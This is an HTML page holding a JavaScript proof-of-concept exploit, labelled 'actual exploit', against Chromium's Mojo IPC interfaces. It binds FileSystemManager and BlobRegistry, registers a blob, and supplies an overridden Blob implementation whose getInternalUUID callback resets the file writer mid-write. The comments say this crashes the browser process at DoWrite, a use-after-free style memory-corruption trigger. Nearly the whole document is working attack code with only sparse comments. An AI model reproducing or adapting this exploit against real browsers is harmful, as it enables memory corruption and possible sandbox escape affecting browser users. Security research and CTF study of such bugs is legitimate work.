<html>
<body>
<!-- the mojo_bindings must be included first -->
<script src="/mojo_bindings.js"></script>
<script src="/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
<script src="/third_party/blink/public/mojom/filesystem/file_system.mojom.js"></script>

<script>
// actual exploit
/* 
https://chromium.googlesource.com/chromium/src/+/master/mojo/public/js/README.md
https://chromium.googlesource.com/chromium/src/+show/master/storage/browser/blob/README.md
*/

function makeid(length) {
    var result           = [];
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result.push(characters.charAt(Math.floor(Math.random() * 
 charactersLength)));
   }
   return result.join('');
}

const blob_id = 'wellow_' + makeid(10);

// interfaces i bind with
let file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
Mojo.bindInterface(blink.mojom.FileSystemManager.name,
					mojo.makeRequest(file_system_manager_ptr).handle, "process");

let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
Mojo.bindInterface(blink.mojom.BlobRegistry.name, mojo.makeRequest(blob_registry_ptr).handle, "process");



let poc = (async function (){

	const getFileWriter = async () => {
		let host_url = new url.mojom.Url();
		host_url.url = 'http://localhost:8000';

		let result = await file_system_manager_ptr.open(host_url, 0);
		
		let file_url = new url.mojom.Url();
		file_url.url = result.rootUrl.url + 'wello';

		var writer = (await file_system_manager_ptr.createWriter(file_url)).writer;

		return writer;
	}

	const writer = await getFileWriter();

	// interfaces i override
	function MyBytesProvider() {
		this.binding = new mojo.Binding(blink.mojom.BytesProvider, this);
	}

	function MyBlobImpl() {
		this.binding = new mojo.Binding(blink.mojom.Blob, this);
	}

	MyBytesProvider.prototype = {
		RequestAsReply: async () => {
			console.log('request as reply');
		},
		RequestAsStream: async (arg0) => {
			console.log('request as stream');
		},
		RequestAsFile: async (arg0, arg1, arg2, arg3) => {
			console.log('request as file');
		}
	}

	MyBlobImpl.prototype = {
		clone: async (arg0) => {
			console.log('clone');
		},
		asDataPipeGetter: async (arg0) => {
			console.log('as data pipe getter');
		},
		readAll: async (arg0, arg1) => {
			console.log('read all');
		},
		readRange: async (arg0, arg1, arg2, arg3) => {
			console.log('read range');
		},
		readSideData: async () => {
			console.log('read side data');
		},
		getInternalUUID: async (arg0) => {
			console.log('get internal uuid');
			writer.ptr.reset();
			return {uuid: blob_id};
		}
	}

	console.log('[+] blob id -> ' + blob_id);
	
	// register blob -> prepare params

	// array of data elements
	let data_element = new blink.mojom.DataElement();
	data_element.bytes = new blink.mojom.DataElementBytes();
	data_element.bytes.length = 1;
	data_element.bytes.embeddedData = [0x41];

	// BytesProvider data;
	let bytes_provider_ptr = new blink.mojom.BytesProviderPtr();
	let bytes_provider_impl = new MyBytesProvider();
	bytes_provider_impl.binding.bind(mojo.makeRequest(bytes_provider_ptr));
	data_element.bytes.data = bytes_provider_ptr;

	/*
	  void Register(blink::mojom::BlobRequest blob,
                const std::string& uuid,
                const std::string& content_type,
                const std::string& content_disposition,
                std::vector<blink::mojom::DataElementPtr> elements,
                RegisterCallback callback) override;
	*/


	let blob_ptr = new blink.mojom.BlobPtr();
	let blob_req = mojo.makeRequest(blob_ptr);

	await blob_registry_ptr.register(blob_req, blob_id, '', '', [data_element]);

	// now we can write with a proper blob
	/*
	  void Write(uint64_t position,
             blink::mojom::BlobPtr blob,
             WriteCallback callback) override;
	*/

	let my_blob_ptr  = new blink.mojom.BlobPtr();
	let my_blob_impl = new MyBlobImpl();

	// there is an implicit
	// std::move(callback).Run(our_overridden_ret_value);
	// so that's where we will collapse, and that's why we 
	// collapse at 'DoWrite', even though we dont explicitly call it
	my_blob_impl.binding.bind(mojo.makeRequest(my_blob_ptr));
	writer.write(0, my_blob_ptr);

})();
</script>
</body>
</html>